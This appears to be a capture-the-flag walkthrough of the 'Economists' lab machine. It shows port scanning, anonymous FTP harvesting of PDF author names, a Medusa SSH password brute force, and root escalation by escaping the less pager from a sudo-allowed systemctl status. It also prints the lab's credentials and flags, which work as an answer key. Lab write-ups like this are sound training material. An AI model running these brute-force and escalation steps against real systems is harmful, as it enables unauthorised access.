+++
title = "Economists - Walkthrough"
date = "2026-07-17"
author = "nvru"
description = "Walkthrough for the Economists machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "ftp",
  "ssh",
  "apache",
  "anonymous-ftp",
  "password-bruteforce",
  "sudo",
  "systemctl",
  "privilege-escalation"
]
draft = false
+++

# Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.26`

The objective was to enumerate the target, identify exposed services, gain initial access by brute-forcing SSH credentials obtained during enumeration, and escalate privileges by abusing a misconfigured `sudo` rule allowing execution of `systemctl`.

![Machine information](/images/hmv/economists/vm.png)

---

# Port Scanning

## RustScan

```bash
rustscan -a 10.10.10.26 -- -sC -sV -A -oA nmap/rust
```

## Results

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    Brochure-1.pdf
| -rw-rw-r--    Brochure-2.pdf
| -rw-rw-r--    Financial-infographics-poster.pdf
| -rw-rw-r--    Gameboard-poster.pdf
| -rw-rw-r--    Growth-timeline.pdf
| -rw-rw-r--    Population-poster.pdf

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

The target exposed three services:

- FTP (anonymous access enabled)
- SSH
- Apache HTTP server

Anonymous FTP immediately stood out as the most promising attack surface.

---

# Enumeration

## FTP

Nmap revealed that anonymous authentication was enabled on the FTP service.

After logging in as `anonymous`, I downloaded all available PDF files.

```text
anonymous
```

```bash
mget ./*
```

![FTP PDFs](/images/hmv/economists/ftp_pdfs.png)

Since the files looked like company documents, I inspected their metadata.

```bash
exiftool * | grep -i autho | cut -d ":" -f2 | uniq > ../../creds/users
```

The metadata revealed several author names which were likely employee usernames.

![PDF authors](/images/hmv/economists/exif_author.png)

Because SSH was available, these usernames would later become useful for password attacks.

---

## Web Enumeration

Browsing the website did not immediately reveal anything interesting.

One useful piece of information was the company email address:

```text
info@elite-economists.hmv
```

This suggested the virtual host:

```text
elite-economists.hmv
```

After adding it to `/etc/hosts`, I continued enumerating the website.

![Email address](/images/hmv/economists/email.png)

![Hosts entry](/images/hmv/economists/hosts.png)

Neither directory brute forcing nor Nikto revealed anything useful, so I shifted my focus back to SSH.

---

## SSH Password Attack

Using the usernames recovered from the PDF metadata, I attempted password brute forcing.


![Hydra](/images/hmv/economists/hydra.png)

RockYou did not produce any valid credentials, so I generated a custom wordlist using CeWL and used Medusa against SSH.

```bash
medusa -M ssh \
-h 10.10.10.26 \
-U creds/users \
-P misc/cewl_passwd
```

A valid credential pair was recovered:

```text
joesph : wealthiest
```

![Medusa](/images/hmv/economists/medusa.png)

---

# Initial Access

Using the recovered credentials, I successfully logged in through SSH.

```text
Username: joesph
Password: wealthiest
```

![SSH Login](/images/hmv/economists/ssh_joseph.png)

---

# Privilege Escalation

## joesph → root

The first step after obtaining a shell was checking the user's sudo permissions.

```bash
sudo -l
```

The output showed that `joesph` could execute:

```text
/usr/bin/systemctl status
```

as **any user**, including **root**, without providing a password.

![Sudo permissions](/images/hmv/economists/sudo_perm.png)

The `systemctl status` command displays its output through the `less` pager by default.

This is important because `less` allows spawning an interactive shell using:

```text
!/bin/bash
```

I started the allowed command:

```bash
sudo -u root /usr/bin/systemctl status
```

Once inside the pager, I executed:

```text
!/bin/bash
```

This immediately spawned a root shell.

![Less escape](/images/hmv/economists/less.png)

Verifying the current user confirmed successful privilege escalation to root

![Root shell](/images/hmv/economists/root.png)

---

# Credentials

```text
joesph:wealthiest
```

---

# Flags

```text
user:HMV{37q3p33CsMJgJQbrbYZMUFfTu}

root:HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}
```
